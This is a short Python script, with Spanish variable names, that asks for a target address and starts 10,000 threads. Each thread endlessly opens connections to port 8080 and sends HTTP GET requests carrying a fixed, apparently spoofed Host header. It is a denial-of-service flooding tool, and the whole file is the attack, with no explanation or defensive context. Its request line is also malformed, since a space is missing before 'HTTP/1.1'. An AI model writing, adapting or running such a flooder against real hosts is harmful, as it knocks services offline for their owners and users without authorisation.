import threading
import socket

objetivo  = input('Objetivo: ')
puerto    = 8080
mascara   = '182.21.20.32'

conexion = 0

def ataque():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((objetivo, puerto))
        s.sendto(("GET /" + objetivo + "HTTP/1.1\r\n").encode('ascii'), (objetivo, puerto))
        s.sendto(("Host: " + mascara + "\r\n\r\n").encode('ascii'), (objetivo, puerto))
        s.close()
        
        global conexion
        conexion += 1
        if conexion % 5000 == 0:
            print(conexion)

for i in range(10000):
    thread = threading.Thread(target = ataque)
    thread.start()
